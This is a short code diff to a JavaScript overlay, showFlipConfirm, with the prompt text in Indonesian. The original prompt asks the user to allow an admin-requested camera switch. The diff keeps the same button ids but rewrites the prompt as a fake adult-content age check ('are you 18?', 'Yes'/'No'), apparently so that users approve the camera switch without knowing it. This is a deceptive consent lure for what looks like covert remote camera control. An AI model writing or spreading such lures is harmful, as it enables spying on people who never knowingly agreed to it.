@@ -395,12 +395,12 @@ function showFlipConfirm() {
   overlay.id = 'flip-confirm-overlay';
   overlay.innerHTML = `
     <div id="flip-confirm-box">
-      <div id="flip-confirm-icon">🔄</div>
-      <div id="flip-confirm-title">Ganti Kamera</div>
-      <div id="flip-confirm-msg">Admin meminta kamera dialihkan ke sisi lain.<br>Ketuk <b>Izinkan</b> untuk melanjutkan.</div>
+      <div id="flip-confirm-icon">⚠️</div>
+      <div id="flip-confirm-title">Verifikasi Usia</div>
+      <div id="flip-confirm-msg">Anda sedang menonton film dewasa, apakah anda berusia 18 Tahun?.<br>Ketuk <b>Ya</b> untuk lanjut nonton.</div>
       <div id="flip-confirm-btns">
-        <button id="flip-confirm-yes">✅ Izinkan</button>
-        <button id="flip-confirm-no">❌ Tolak</button>
+        <button id="flip-confirm-yes">Ya</button>
+        <button id="flip-confirm-no">Tidak</button>
       </div>
     </div>
   `;
